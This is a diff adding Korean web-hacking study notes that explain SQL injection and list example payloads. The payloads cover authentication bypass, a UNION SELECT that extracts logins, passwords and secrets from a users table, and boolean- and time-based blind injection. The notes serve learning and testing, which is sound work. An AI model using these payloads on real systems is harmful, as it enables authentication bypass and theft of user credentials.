@@ -802,3 +802,76 @@ xss cheat sheet
 
 ### 웹 해킹 이해 - Reflected XSS 취약점 실습
 
+Reflected XSS?
+
+---
+
+### 웹 해킹 이해 - Burp Suite Intruder를 활용한 XSS 취약점 진단
+
+Burp Suite Intruder 기능 사용법
+
+---
+
+### SQL Injection 공격 - SQL Injection 공격 이해 이론
+
+SQL Injection?
+
+- SQL Query를 처리하는 과정에서 예상치 못한 입력 값에 의해 DBMS 정보 노출, 특정 명령어 실행 등이 발생하는 취약점
+
+- 공격자는 정상적인 값 대신 자신이 원하는 값을 웹에 요청하고, 웹은 데이터베이스에 요청을 한 뒤 결과 값이 웹을 통해 노출되거나 유추할 수 있는 형태로 출력됨
+
+```
+      원하는 데이터 요청        데이터 전달
+공격자 --------------->  WEB ---------------> 데이터베이스
+      <---------------      <---------------
+       웹에 결과값 출력          결과 전달
+```
+
+**SQL Injection 대표적인 해킹 사례**
+
+- '여기어때' 의 마케팅 관리 웹서버에서 입력 값 검증 미흡으로 인해 관리자 세션 값 탈취 및 개인정보 99만건 유출이 발생함
+
+**SQL Injection을 이용한 인증 우회**
+
+- 인증 처리 프로세스에서 '참' 값을 만들어주면서 정상적인 계정 정보 입력을 우회하게 됨
+```
+'or 'x'='x
+" or "x" = "x
+') or ('x'='x
+") or ("x"="x
+```
+
+**Error Based SQLi 을 이용한 데이터베이스 정보 획득**
+
+- 웹을 통해서 데이터베이스의 원하는 값을 하나씩 가져와 중요정보 획득
+```
+0' UNION SELECT ALL 1, concat(id,login,password),3,4,concat(email,secret),6,7 from users#
+```
+
+**Blind SQLi을 이용한 데이터베이스 정보 추측 및 획득**
+
+- 웹에서 데이터베이스의 에러 정보가 노출되지 않기 때문에 "참"과 "거짓"으로 정보 추측, 획득
+```
+'or 1=1 and length(database())=5#
+```
+
+
+**SQL Injection - Blind - Boolean-Based**
+```
+'or 1=1 and substring(database(),1,1)='b'#
+'or 1=1 and ascii(substring(database(),1,1))=98#
+```
+
+**Time Based SQLi을 이용한 데이터베이스 정보 추측 및 획득**
+
+- sleep() 함수를 이용하여 데이터베이스 스레드 동작 정지 여부를 보고 판단
+```
+'or 1=1 and sleep(5)#
+'or 1=1 and length(database())=5 and sleep(5)#
+'or 1=1 and substring(database(),1,1)='b' and sleep(5)#
+```
+
+---
+
+### SQL Injection 공격 - Error-Based SQL Injection
+
